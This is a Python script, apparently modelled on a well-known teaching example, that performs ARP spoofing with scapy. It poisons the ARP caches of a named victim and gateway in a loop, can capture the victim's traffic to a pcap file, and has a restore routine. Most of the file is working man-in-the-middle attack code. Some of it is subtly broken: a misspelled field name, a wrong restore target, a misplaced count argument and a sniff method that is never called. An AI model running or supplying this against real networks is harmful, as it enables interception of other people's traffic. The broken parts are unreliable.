import sys
import time
import socket
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, 
                       send, sniff, sndrcv, srp, wrpcap)

def get_my_ip():
    try:
        # Create a socket to get the local IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        # Doesn't need to be reachable
        s.connect(("10.0.0.0", 80))
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address
    except socket.error:
        return None

def print_summary(arp):
    print(f"ip src: {arp.psrc}")
    print(f"ip dst: {arp.pdst}")
    print(f"mac dst: {arp.hwdst}")
    print(f"mac source: {arp.hwdsrc}")
    print(arp.summary())
    print('-'*30)

def get_mac_address(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateaway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac_address(victim)
        self.gateaway = gateaway
        self.gateawaymac = get_mac_address(gateaway)

        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f"Initialized {interface}")
        print(f"Gateaway ({gateaway}) is at {self.gateawaymac}")
        print(f"Victim ({victim}) is at {self.victimmac}")
        print("-"*30)

        
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateaway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print_summary(poison_victim)

        poison_gateaway = ARP()
        poison_gateaway.op = 2
        poison_gateaway.psrc = self.victim
        poison_gateaway.pdst = self.gateaway
        poison_gateaway.hwdst = self.gateawaymac
        print_summary(poison_gateaway)

        print(f"Beginning the ARP poison. [CTRL-C to stop]")
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()

            try:
                send(poison_victim)
                send(poison_gateaway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)


    def sniff(self, count=100):
        time.sleep(5)
        print(f"Sniffing {count} packets")
        bpf_filter = "ip host %s" % self.victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print("Finished.")

    def restore(self):
        print("Restoring ARP tables...")
        
        send(ARP(
            op=2,
            psrc=self.gateaway,
            hwsrc=self.gateawaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff',
            count=5
        ))

        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff',
            count=5
        ))

def main():
    if len(sys.argv) != 4:
        print("Usage: python script.py <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]

    print(f"Victim IP: {victim_ip}")
    print(f"Gateway IP: {gateway_ip}")
    print(f"Interface: {interface}")

    arp = Arper(victim_ip, gateway_ip, interface)
    arp.run()

if __name__ == '__main__':
    main()